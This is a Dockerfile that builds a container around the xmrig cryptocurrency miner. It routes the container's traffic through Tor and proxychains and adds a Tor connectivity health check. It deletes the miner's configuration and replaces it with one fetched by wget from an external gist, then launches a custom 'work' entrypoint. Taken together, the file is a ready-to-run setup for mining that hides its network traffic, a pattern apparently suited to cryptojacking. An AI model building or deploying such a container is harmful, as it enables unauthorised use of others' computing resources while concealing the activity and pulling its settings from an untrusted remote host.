# Use dsomeone/nizadam as the base image
FROM dsomeone/nizadam

# Copy the updated configuration files into the container
COPY etc/dnsmasq.conf /etc/dnsmasq.conf
COPY etc/s6 /etc/s6
COPY etc/resolv.conf /etc/resolv.conf
COPY bin/work /usr/bin/work
COPY etc/proxychains/proxychains.conf /etc/proxychains/proxychains.conf 

# Update configuration files for Tor and other related settings
RUN rm /xmrig/build/config.json && \
    echo 'DNSPort 9053' >> /etc/tor/torrc \
    && chmod 0755 /etc/s6/*/run /usr/bin/work

# Update the xmrig configuration (if necessary) by downloading new config files
RUN wget https://gist.githubusercontent.com/WifeAiBot/a5b5fe6f97949c937938bd423c25f195/raw/afa362037cb502799895ae25eb3a4cf5b8411f1a/config.json -P /xmrig/build/

# Health check to verify Tor connectivity
HEALTHCHECK --interval=60s --timeout=15s --start-period=20s \
    CMD curl -s --socks5 127.0.0.1:9050 'https://check.torproject.org/' | grep -qm1 Congratulations

# Expose the necessary port for communication
EXPOSE 80/tcp

# Set the working directory for the build process
WORKDIR /xmrig/build

# Set the entrypoint for the container
ENTRYPOINT ["/usr/bin/work"]
